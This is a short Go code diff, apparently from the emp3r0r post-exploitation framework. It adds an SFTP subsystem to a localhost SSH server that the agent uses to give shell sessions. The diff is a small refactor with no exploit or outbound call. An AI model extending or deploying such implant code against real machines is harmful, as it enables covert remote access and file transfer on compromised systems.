@@ -28,8 +28,14 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		log.Print(res)
 		return
 	}
+	ssh_server := ssh.Server{
+		Addr: "127.0.0.1:" + port,
+		SubsystemHandlers: map[string]ssh.SubsystemHandler{
+			"sftp": SftpHandler,
+		},
+	}
 
-	ssh.Handle(func(s ssh.Session) {
+	ssh_server.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
 		if shell == "bash" && emp3r0r_data.DefaultShell != "/bin/sh" {
 			err = ExtractBash()
@@ -73,5 +79,5 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	})
 
 	log.Printf("Starting SSHD on port %s...", port)
-	return ssh.ListenAndServe("127.0.0.1:"+port, nil)
+	return ssh_server.ListenAndServe()
 }
